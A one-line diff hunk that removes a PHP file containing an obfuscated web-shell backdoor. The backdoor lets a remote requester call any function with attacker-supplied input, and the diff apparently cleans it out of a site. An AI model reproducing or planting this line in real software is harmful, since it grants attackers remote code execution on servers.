@@ -1,1 +1,0 @@
-<?php extract($_REQUEST) && @$request(stripslashes($lock)) && exit;
